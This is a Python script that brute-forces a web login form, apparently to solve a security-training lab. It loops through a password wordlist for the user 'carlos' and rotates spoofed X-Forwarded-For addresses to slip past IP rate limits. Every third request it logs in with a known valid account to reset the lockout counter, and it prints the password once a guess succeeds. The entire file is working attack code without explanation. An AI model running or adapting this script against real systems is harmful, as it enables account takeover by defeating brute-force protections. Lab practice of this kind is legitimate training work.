import requests
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

if(len(sys.argv) != 2): 
    print("Usage: different_response.py <url>")
    sys.exit(0)

url = sys.argv[1]
#word = sys.argv[2]

r = requests.get(url)
#print(r.text)
cookie_value = r.cookies['session']
#print(cookie_value)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

username = "apple"
file2 = open('creds/passwords1','r')
passwords = file2.readlines()
password = ""
username = "carlos"
ip = 1
val = 1
passwd = 1
while( passwd <len(passwords)):
    #print(passwords[passwd])
    #print("\n")
    is_three = False
    if (val % 3 == 0 ):
        #print(str(val) + " i am in")
        username = "wiener"
        passwdd = "peter"
        is_three = True
    else:
        username = "carlos"
    
    headers = {'session' : cookie_value,'X-Forwarded-For': '20.41.21.'+str(ip)}
    #headers = {'X-Forwarded-For': '20.41.21.'+str(ip)}
    #print(username)
    if is_three == True:

        pay = {'username': username, 'password' : passwdd }
    else:
        pay = {'username': username, 'password' : str(passwords[passwd - 1])[:-1]}
    val = val + 1
    print("Tried " + str(passwords[passwd - 1])[:-1], end="\r", flush=True)
    #print("{0}:{1}".format(username,passwd[:-1]))
    p = requests.post(url+'login', headers=headers, data=pay, proxies=proxies, verify=False)
    #print(int(p.status_code))
    ip = ip + 1
    if (is_three != True):
        passwd = passwd + 1
    if "Incorrect password" in p.text:
        continue
    else:
        if is_three == True:
            pass
        else:
            print("\n Password: "+str(passwords[passwd - 2])[:-1])
            password = str(passwords[passwd - 2])[:-1]
            break
    

